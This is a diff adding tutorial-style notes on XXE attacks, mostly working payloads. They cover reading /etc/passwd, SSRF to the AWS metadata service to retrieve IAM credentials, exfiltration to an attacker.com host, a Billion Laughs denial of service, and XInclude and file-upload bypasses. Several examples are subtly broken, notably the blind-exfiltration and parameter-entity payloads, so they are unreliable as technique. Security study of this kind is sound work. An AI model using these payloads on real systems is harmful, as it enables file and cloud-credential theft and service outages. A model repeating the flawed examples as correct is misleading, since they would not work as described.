@@ -1,0 +1,117 @@
+What is XXE?
+XXE (XML External Entity) is a vulnerability that occurs when:
+An application parses XML input
+And allows external entities to be defined and processed
+
+👉 This lets an attacker:
+
+Read files
+Perform SSRF
+Cause DoS
+Exfiltrate data
+⚙️ Basic XML concept (important)
+Normal XML
+
+<user>
+  <name>kaushal</name>
+</user>
+
+XML with ENTITY
+
+<!DOCTYPE foo [
+  <!ENTITY test "Hello">
+]>
+<user>
+  <name>&test;</name>
+</user>
+
+👉 Output:
+Hello
+🔥 XXE Attack Core Idea
+
+Instead of normal value, you define:
+
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+
+👉 Now:
+
+<name>&xxe;</name>
+
+👉 Server reads file and injects content
+
+📂 1. File Read (Classic XXE)
+
+Payload
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<stockCheck>
+  <productId>&xxe;</productId>
+  <storeId>1</storeId>
+</stockCheck>
+Result
+root:x:0:0:root:/root:/bin/bash
+...
+
+
+🌐 2. XXE → SSRF (Very Important)
+
+👉 Use URL instead of file:
+
+<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+Real attack flow (AWS metadata)
+Step 1: Get role
+<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+Step 2: Get secrets
+<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME">
+Output
+{
+  "AccessKeyId": "...",
+  "SecretAccessKey": "...",
+  "Token": "..."
+}
+
+👉 This is critical (P1 bug)
+
+
+
+🕶️ 3. Blind XXE (No direct response)
+
+When response doesn’t show data.
+Use external server:
+<!ENTITY xxe SYSTEM "http://attacker.com/?data=file:///etc/passwd">
+👉 Server sends request to attacker → data leak
+
+
+
+💣 4. Billion Laughs (DoS attack)
+<!DOCTYPE lolz [
+ <!ENTITY a "lol">
+ <!ENTITY b "&a;&a;&a;&a;&a;">
+ <!ENTITY c "&b;&b;&b;&b;&b;">
+]>
+👉 Causes memory exhaustion → crash
+
+
+
+🔁 5. Parameter Entities (Advanced XXE)
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY data "%xxe;">
+]>
+🚫 When XXE DOESN’T work
+Input is not parsed as XML
+DTD is disabled
+External entities blocked
+
+
+🔥 Bypass techniques
+1. XInclude (when no DOCTYPE)
+<xi:include xmlns:xi="http://www.w3.org/2001/XInclude"
+            href="file:///etc/passwd"
+            parse="text"/>
+2. SVG upload XXE
+3. File upload (DOCX, XLSX, etc.)
+👉 These are ZIP + XML → inject XXE inside
+
